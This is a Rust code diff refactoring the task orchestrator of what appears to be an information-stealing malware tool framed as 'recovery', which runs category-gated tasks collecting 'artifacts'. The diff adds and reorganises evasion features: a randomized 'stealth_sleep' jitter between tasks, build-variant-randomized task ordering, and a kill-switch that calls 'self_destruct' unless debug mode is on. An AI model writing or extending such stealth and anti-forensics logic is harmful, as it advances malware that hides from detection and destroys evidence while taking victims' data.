@@ -7,7 +7,7 @@ use std::time::Instant;
 use tokio::fs;
 use tokio::sync::{OwnedSemaphorePermit, Semaphore};
 use tokio::task::JoinSet;
-use tracing::{debug, info};
+use tracing::{debug, info, warn};
 
 pub struct RecoveryManager {
     context: RecoveryContext,
@@ -34,61 +34,80 @@ impl RecoveryManager {
 
     pub async fn run_all(&self) -> Result<Vec<RecoveryOutcome>, RecoveryError> {
         fs::create_dir_all(&self.context.output_dir).await?;
-        let semaphore = Arc::new(Semaphore::new(self.context.concurrency_limit));
-        let mut join_set = JoinSet::new();
+        
         let control = RecoveryControl::global();
+        let tasks = self.prepare_ordered_tasks(control);
+        
         info!(
             build_variant = %build_config::BUILD_VARIANT.describe(),
-            "ordering tasks with randomized build variant"
+            "starting recovery session with {} tasks",
+            tasks.len()
         );
 
-        let mut ordered_tasks: Vec<(u64, Arc<dyn RecoveryTask>)> = self
-            .tasks
-            .iter()
-            .map(|task| {
-                (
-                    build_config::task_order_key(&task.label()),
-                    Arc::clone(task),
-                )
-            })
-            .collect();
-        ordered_tasks.sort_unstable_by_key(|(key, _)| *key);
+        let semaphore = Arc::new(Semaphore::new(self.context.concurrency_limit));
+        let mut join_set = JoinSet::new();
 
-        for (_, task) in ordered_tasks.into_iter() {
-            if !control.allows_category(task.category()) {
-                debug!(
-                    task=%task.label(),
-                    category=?task.category(),
-                    "skipping disabled category"
-                );
-                continue;
-            }
-            let permit =
-                semaphore.clone().acquire_owned().await.map_err(|err| {
-                    RecoveryError::Custom(format!("semaphore acquire failed: {err}"))
-                })?;
+        for task in tasks {
+            let permit = semaphore.clone().acquire_owned().await.map_err(|err| {
+                RecoveryError::Custom(format!("semaphore acquire failed: {err}"))
+            })?;
+
             let task = Arc::clone(&task);
             let ctx = self.context.clone();
+            let debug_enabled = control.debug_enabled();
 
-            if build_config::BUILD_VARIANT != build_config::BuildVariant::Alpha {
-                use crate::recovery::helpers::sleep::stealth_sleep;
-                use rand::Rng;
-                let jitter = rand::thread_rng().gen_range(50..200);
-                stealth_sleep(jitter);
-            }
-
-            join_set.spawn(Self::execute_task(task, ctx, permit));
+            join_set.spawn(async move {
+                Self::pre_task_stealth(debug_enabled).await;
+                Self::execute_task(task, ctx, permit).await
+            });
         }
 
-        let mut outcomes = Vec::with_capacity(self.tasks.len());
-        while let Some(res) = join_set.join_next().await {
-            match res? {
-                Ok(outcome) => outcomes.push(outcome),
-                Err(RecoveryError::KillSwitchTriggered) => {
-                    info!("kill-switch triggered, initiating self-destruct");
-                    self.self_destruct();
+        let outcomes = self.collect_outcomes(&mut join_set).await?;
+        Ok(outcomes)
+    }
+
+    fn prepare_ordered_tasks(&self, control: &RecoveryControl) -> Vec<Arc<dyn RecoveryTask>> {
+        let mut tasks: Vec<Arc<dyn RecoveryTask>> = self.tasks.iter()
+            .filter(|task| {
+                let allowed = control.allows_category(task.category());
+                if !allowed {
+                    debug!(task=%task.label(), category=?task.category(), "skipping disabled category");
                 }
-                Err(err) => return Err(err),
+                allowed
+            })
+            .map(Arc::clone)
+            .collect();
+
+        tasks.sort_unstable_by_key(|task| build_config::task_order_key(&task.label()));
+        tasks
+    }
+
+    async fn pre_task_stealth(debug_enabled: bool) {
+        if !debug_enabled && build_config::BUILD_VARIANT != build_config::BuildVariant::Alpha {
+            use crate::recovery::helpers::sleep::stealth_sleep;
+            use rand::Rng;
+            let jitter = rand::thread_rng().gen_range(50..200);
+            stealth_sleep(jitter).await;
+        }
+    }
+
+    async fn collect_outcomes(&self, join_set: &mut JoinSet<Result<RecoveryOutcome, RecoveryError>>) -> Result<Vec<RecoveryOutcome>, RecoveryError> {
+        let mut outcomes = Vec::with_capacity(self.tasks.len());
+        let control = RecoveryControl::global();
+
+        while let Some(res) = join_set.join_next().await {
+            match res {
+                Ok(Ok(outcome)) => outcomes.push(outcome),
+                Ok(Err(RecoveryError::KillSwitchTriggered)) => {
+                    if control.debug_enabled() {
+                        debug!("kill-switch triggered, but continuing due to debug mode");
+                    } else {
+                        info!("kill-switch triggered, initiating self-destruct");
+                        self.self_destruct();
+                    }
+                }
+                Ok(Err(err)) => warn!(error=?err, "task returned unhandled error"),
+                Err(err) => warn!(error=?err, "task join failed"),
             }
         }
 
@@ -139,13 +158,35 @@ impl RecoveryManager {
             }
         };
 
-        info!(
-            task=%label,
-            status=?status,
-            artifacts=%artifacts.len(),
-            duration=?duration,
-            "task completed"
-        );
+        match status {
+            RecoveryStatus::Success => {
+                info!(
+                    task=%label,
+                    status=?status,
+                    artifacts=%artifacts.len(),
+                    duration=?duration,
+                    "task completed"
+                );
+            }
+            RecoveryStatus::NotFound => {
+                debug!(
+                    task=%label,
+                    status=?status,
+                    artifacts=%artifacts.len(),
+                    duration=?duration,
+                    "task completed"
+                );
+            }
+            RecoveryStatus::Failed => {
+                warn!(
+                    task=%label,
+                    status=?status,
+                    error=?error,
+                    duration=?duration,
+                    "task completed"
+                );
+            }
+        }
 
         Ok(RecoveryOutcome {
             task: label,
@@ -177,9 +218,8 @@ impl RecoveryManager {
     fn status_rank(status: RecoveryStatus) -> u8 {
         match status {
             RecoveryStatus::Success => 0,
-            RecoveryStatus::Partial => 1,
-            RecoveryStatus::NotFound => 2,
-            RecoveryStatus::Failed => 3,
+            RecoveryStatus::NotFound => 1,
+            RecoveryStatus::Failed => 2,
         }
     }
 }
